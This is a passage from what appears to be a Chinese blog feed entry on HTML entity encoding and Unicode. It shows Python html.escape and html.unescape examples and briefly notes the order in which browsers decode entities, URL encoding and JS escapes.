class="line">⇨ &lt;!-- 右白色箭头，产生⇨ --&gt;</span><br></pre></td></tr></table></figure><p>Unicode</p><p>Unicode是一种将字符映射为数字的标准。每个字符都有一个唯一的Unicode编码值。例如，字母“A”的Unicode编码值是65，数字“1”的Unicode编码值是49。Unicode兼容多种语言和字符集，使得不同的文本可以在不同的计算机系统和软件中正确显示。</p><p>将HTML实体转换为Unicode编码</p><p>要将HTML实体转换为Unicode编码，可以使用HTML解码器或函数。以下是一个使用Python的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">html_entity = &quot;&lt;p&gt;Hello, World!&lt;/p&gt;&quot;</span><br><span class="line"></span><br><span class="line">unicode_text = html.unescape(html_entity)</span><br><span class="line"></span><br><span class="line">print(unicode_text) # 输出 &lt;p&gt;Hello, World!&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>将Unicode编码转换为HTML实体</p><p>同样地，要将Unicode编码转换为HTML实体，可以使用HTML编码器或函数。以下是一个使用Python的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = &quot;&lt;p&gt;Hello, World!&lt;/p&gt;&quot;</span><br><span class="line"></span><br><span class="line">html_entity = html.escape(text)</span><br><span class="line"></span><br><span class="line">print(html_entity) # 输出 &lt;p&gt;Hello, World!&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>通过了解和掌握HTML实体和Unicode编码的转换方法，可以在处理HTML文档时正确显示特殊字符。无论是在网页开发还是在处理HTML文本的应用中，这些知识都是非常重要的。</p><p>这些编码都跟ASCII码有着密不可分的关系</p><p>浏览器解析顺序</p><p>HTML实体编码 -&gt; urlencode -&gt; js unicode</p><p>在urlencode 或者decode 的时候  不能编码协议</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;HTML实体编码和Unicode&quot;&gt;&lt;a href=&quot;#HTML实体编码和Unicode&quot; class=&quot;headerlink&quot; title=&quot;[HTML实体编码和Unicode]&quot;&gt;&lt;/a&gt;[HTML实体编码和Unicode]&lt;/h2&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="编码" scheme="https://heisha123.github.io/tags/%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
</feed>
